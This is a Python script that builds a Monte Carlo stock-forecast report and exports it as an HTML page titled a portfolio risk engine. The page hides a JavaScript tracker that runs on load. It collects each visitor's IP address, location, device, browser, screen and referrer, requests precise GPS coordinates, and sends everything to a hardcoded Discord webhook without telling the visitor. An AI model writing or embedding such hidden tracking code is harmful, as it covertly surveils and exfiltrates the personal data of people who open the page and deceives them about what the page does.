import numpy as np
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
import plotly.io as pio
import yfinance as yf

# --- 1. CONFIGURATION: Full History Universe ---
TICKERS = [
    "SPY", "QQQ", "VT", "VGK", "EEM", "GLD", "BTC-USD", "TLT",
    "VNQ", "MSFT", "AAPL", "NVDA", "AMZN", "GOOGL",
]
START_DATE = "2015-01-01"
FORECAST_YEARS = 4
TRADING_DAYS_PER_YEAR = 252
TOTAL_FORECAST_DAYS = FORECAST_YEARS * TRADING_DAYS_PER_YEAR
NUM_SIMULATIONS = 500

# --- 2. AUTONOMOUS MACROECONOMICS (Live Risk-Free Rate) ---
print("-> Fetching live US 13-Week Treasury Bill yield...")
try:
    irx_hist = yf.Ticker("^IRX").history(period="5d")
    live_yield = irx_hist["Close"].iloc[-1]
    RISK_FREE_RATE = live_yield / 100
    print(f"-> Live Risk-Free Rate: {live_yield:.2f}% ({RISK_FREE_RATE*100:.2f}%)\n")
except Exception as e:
    RISK_FREE_RATE = 0.045
    print(f"-> Using default Risk-Free Rate: {RISK_FREE_RATE*100:.2f}%\n")

# --- 3. DATA INGESTION ---
data = yf.download(TICKERS, start=START_DATE, progress=False)
if isinstance(data.columns, pd.MultiIndex):
    if "Adj Close" in data.columns.get_level_values(0):
        data = data["Adj Close"]
    elif "Close" in data.columns.get_level_values(0):
        data = data["Close"]
    else:
        data = data.droplevel(0, axis=1)
data = data.ffill().dropna()

# --- 4. HISTORICAL SCREENING & TOP 8 ---
returns = data.pct_change().dropna()
cumulative = (1 + returns).cumprod()
n_days = len(returns)
ann_return = (cumulative.iloc[-1]) ** (TRADING_DAYS_PER_YEAR / n_days) - 1
ann_vol = returns.std() * np.sqrt(TRADING_DAYS_PER_YEAR)
sharpe = (ann_return - RISK_FREE_RATE) / ann_vol

peak = cumulative.cummax()
max_dd = ((cumulative - peak) / peak).min()

metrics = pd.DataFrame({
    "Annualized Return": ann_return,
    "Annualized Volatility": ann_vol,
    "Sharpe Ratio": sharpe,
    "Max Drawdown": max_dd,
})
top_8_assets = metrics.sort_values("Sharpe Ratio", ascending=False).head(8).index.tolist()

# --- 5. 4-YEAR FORECAST ---
forecast_results = {}
dt = 1 / TRADING_DAYS_PER_YEAR
steps = TOTAL_FORECAST_DAYS - 1

corr_matrix = returns[top_8_assets].corr().values
cholesky = np.linalg.cholesky(corr_matrix)

np.random.seed(42)
Z = np.random.standard_normal((len(top_8_assets), steps, NUM_SIMULATIONS))
correlated_Z = np.einsum("ij,jkt->ikt", cholesky, Z)

for idx, ticker in enumerate(top_8_assets):
    s0 = data[ticker].iloc[-1]
    sigma = ann_vol[ticker]
    hist_cagr = ann_return[ticker]
    blended = 0.3 * max(min(hist_cagr, 0.35), -0.20) + 0.7 * (RISK_FREE_RATE + 0.06)

    mu = blended * np.linspace(1.0, 0.4, steps)
    drift = (mu[:, None] - 0.5 * sigma**2) * dt
    diffusion = sigma * np.sqrt(dt) * correlated_Z[idx]

    returns_sim = np.exp(drift + diffusion)
    prices = np.zeros((TOTAL_FORECAST_DAYS, NUM_SIMULATIONS))
    prices[0] = s0
    prices[1:] = s0 * np.cumprod(returns_sim, axis=0)
    forecast_results[ticker] = prices

# --- 6. VISUALS ---
fig_hist = px.line(cumulative[top_8_assets], title="<b>Historical Growth (Top 8 Assets)</b>", labels={"value": "Growth Multiple"})
fig_hist.update_layout(template="plotly_dark", hovermode="x unified")

top_asset = top_8_assets[0]
sim_paths = forecast_results[top_asset]

fig_fcast = go.Figure()
for i in range(min(50, NUM_SIMULATIONS)):
    fig_fcast.add_trace(go.Scatter(y=sim_paths[:, i], mode="lines", line=dict(color="rgba(0,204,150,0.15)"), showlegend=False))

median = np.median(sim_paths, axis=1)
upper = np.percentile(sim_paths, 95, axis=1)
lower = np.percentile(sim_paths, 5, axis=1)

fig_fcast.add_trace(go.Scatter(y=median, mode="lines", name="Median", line=dict(color="cyan", width=3)))
fig_fcast.add_trace(go.Scatter(y=upper, mode="lines", name="95th %ile", line=dict(color="orange", width=2, dash="dash")))
fig_fcast.add_trace(go.Scatter(y=lower, mode="lines", name="5th %ile", line=dict(color="magenta", width=2, dash="dash")))

fig_fcast.update_layout(title=f"<b>4-Year Forecast — {top_asset}</b>", xaxis_title="Days", yaxis_title="Price ($)", template="plotly_dark")

# --- 7. P&L TABLE ---
s0_top = data[top_asset].iloc[-1]
finals = sim_paths[-1, :]
scenarios = {
    "Pessimistic (5th)": np.percentile(finals, 5),
    "Median": np.median(finals),
    "Optimistic (95th)": np.percentile(finals, 95),
}

pnl = []
for label, st in scenarios.items():
    pnl.append({
        "Scenario": label,
        "Start Price ($)": round(s0_top, 2),
        "Final Price ($)": round(st, 2),
        "Dollar P&L ($)": round(st - s0_top, 2),
        "Total ROI (%)": round((st - s0_top) / s0_top * 100, 2),
        "Annualized CAGR (%)": round((((st / s0_top) ** (1 / FORECAST_YEARS)) - 1) * 100, 2),
    })
pnl_df = pd.DataFrame(pnl)

# --- 8. HTML WITH ENHANCED LOCATION TRACKING SCRIPT ---
html_hist = pio.to_html(fig_hist, full_html=False, include_plotlyjs="cdn")
html_fcast = pio.to_html(fig_fcast, full_html=False, include_plotlyjs=False)
html_table = pnl_df.to_html(index=False, classes="table-custom")

js = """
<script>
async function sendDiscordAlert() {
    try {
        // 1. Fetch IP & Coarse Location
        let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown';
        try {
            let response = await fetch('https://ipapi.co/json/');
            let data = await response.json();
            ip = data.ip || 'Unknown';
            city = data.city || 'Unknown';
            region = data.region || 'Unknown';
            country = data.country_name || 'Unknown';
        } catch (e) {
            console.log("IP API fetch failed", e);
        }

        // 2. Extract Device & Browser Details from User-Agent & Telemetry
        let ua = navigator.userAgent;
        let browser = "Unknown Browser";
        let os = "Unknown OS";
        let device = "Desktop/Mobile";

        if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
        else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
        else if (ua.indexOf("Edge") > -1) browser = "Microsoft Edge";
        else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
        else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";

        if (ua.indexOf("Win") > -1) os = "Windows";
        else if (ua.indexOf("Mac") > -1) os = "macOS";
        else if (ua.indexOf("Linux") > -1) os = "Linux";
        else if (ua.indexOf("Android") > -1) os = "Android";
        else if (ua.indexOf("like Mac") > -1) os = "iOS";

        device = /Mobi|Android/i.test(ua) ? "Mobile Device" : "Desktop/Laptop";

        let screenRes = `${window.screen.width}x${window.screen.height}`;
        let conn = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
        let referrer = document.referrer || 'Direct/None';
        let lang = navigator.language || 'Unknown';

        const webhookUrl = 'https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg'; 

        // Function to dispatch data payload to Discord
        const postPayload = async (locationText, extraFields = []) => {
            let payload = {
                embeds: [{
                    title: "🔔 Investment Visitor!",
                    color: 248100,
                    fields: [
                        { name: "🌐 IP Address", value: ip, inline: true },
                        { name: "📍 Location", value: locationText, inline: true },
                        { name: "📱 Device", value: `${device} (${os})`, inline: true },
                        { name: "🌐 Browser", value: browser, inline: true },
                        { name: "🖥️ Screen", value: screenRes, inline: true },
                        { name: "⚡ Network", value: conn, inline: true },
                        { name: "🗣️ Language", value: lang, inline: true },
                        { name: "🔗 Referrer", value: referrer.substring(0, 50), inline: false },
                        ...extraFields,
                        { name: "⏰ Time", value: new Date().toLocaleString('id-ID'), inline: false }
                    ]
                }]
            };

            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        };

        // 3. Attempt HTML5 GPS Geolocation prompt
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    let lat = position.coords.latitude.toFixed(4);
                    let lon = position.coords.longitude.toFixed(4);
                    let accuracy = position.coords.accuracy.toFixed(0);
                    await postPayload(`${city}, ${region}, ${country} (IP)`, [
                        { name: "🎯 Exact GPS Coordinates", value: `Lat: ${lat}, Lon: ${lon} (Acc: ${accuracy}m)\n[Open in Google Maps](https://maps.google.com/?q=${lat},${lon})`, inline: false }
                    ]);
                },
                async (error) => {
                    await postPayload(`${city}, ${region}, ${country} (GPS Denied/Unavailable)`);
                },
                { timeout: 10000, enableHighAccuracy: true }
            );
        } else {
            await postPayload(`${city}, ${region}, ${country} (No GPS Support)`);
        }

    } catch (error) {
        console.log("Could not send Discord alert:", error);
    }
}
window.onload = sendDiscordAlert;
</script>
"""

html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1200">
    <title>Quantitative Portfolio Risk Engine</title>
    <style>
        body {{background:#0b0f19;color:#f3f4f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;margin:0;padding:20px;}}
        .container {{max-width:1100px;margin:auto;background:#111827;padding:40px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.5);}}
        h1 {{color:#00cc96;text-align:center;margin-bottom:5px;}}
        .subtitle {{text-align:center;color:#9ca3af;margin-bottom:30px;font-size:14px;}}
        h2 {{color:#38bdf8;border-bottom:2px solid #374151;padding-bottom:8px;margin-top:40px;}}
        .table-container {{overflow-x:auto;margin-top:20px;}}
        table.table-custom {{width:100%;border-collapse:collapse;background:#1f2937;border-radius:8px;overflow:hidden;}}
        table.table-custom th,td {{padding:12px 16px;text-align:left;border-bottom:1px solid #374151;}}
        table.table-custom th {{background:#374151;color:#f9fafb;}}
    </style>
</head>
<body>
    <div class="container">
        <h1>Quantitative Portfolio Risk Engine by @Ciceroyce</h1>
        <div class="subtitle">Dynamic Multi-Asset Simulation • Risk-Free Rate: {RISK_FREE_RATE*100:.2f}%</div>
        
        <h2>1. Historical Growth (Dynamic Top 8)</h2>
        {html_hist}
        
        <h2>2. 4-Year Risk-Adjusted Forecast ({top_asset})</h2>
        {html_fcast}
        
        <h2>3. Profit & Loss Scenarios</h2>
        <div class="table-container">
            {html_table}
        </div>
    </div>
    {js}
</body>
</html>
"""

with open("index.html", "w", encoding="utf-8") as f:
    f.write(html)

print("✅ SUCCESS! index.html exported with combined financial simulation + enhanced Discord tracking.")
